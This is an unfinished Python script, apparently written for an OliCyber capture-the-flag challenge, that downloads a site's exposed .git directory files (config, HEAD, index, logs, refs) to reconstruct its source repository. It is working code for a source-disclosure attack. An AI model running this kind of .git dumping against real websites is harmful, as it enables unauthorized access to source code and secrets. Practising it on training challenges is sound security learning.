import requests, os, wget # TODO FINIRE
site = "http://iforgot.challs.olicyber.it"
s = ["/index.js", "/package.json", "/package-lock.json", "/robots.txt"] # uso dirsearch (tool python)
os.makedirs("IFORGOT")
os.chdir("IFORGOT")
for i in s:
    wget.download(site + i)
os.makedirs(".git")
os.chdir(".git")
s = ["/.git/config", "/.git/description", "/.git/HEAD", "/.git/COMMIT_EDITMSG", "/.git/index"]
for i in s:
    wget.download(site + i)
os.makedirs("logs")
os.makedirs("info")
os.makedirs("refs")
wget.download(site + "/.git/info/exclude", "info")
wget.download(site + "/.git/logs/HEAD", "logs")
os.chdir("logs")
os.makedirs("refs")
os.chdir("refs")
os.makedirs("heads")
os.chdir("heads")
wget.download(site + "/.git/logs/refs/heads/master")
os.chdir("../../../refs")
os.makedirs("heads")
os.chdir("heads")
wget.download(site + "/.git/refs/heads/master")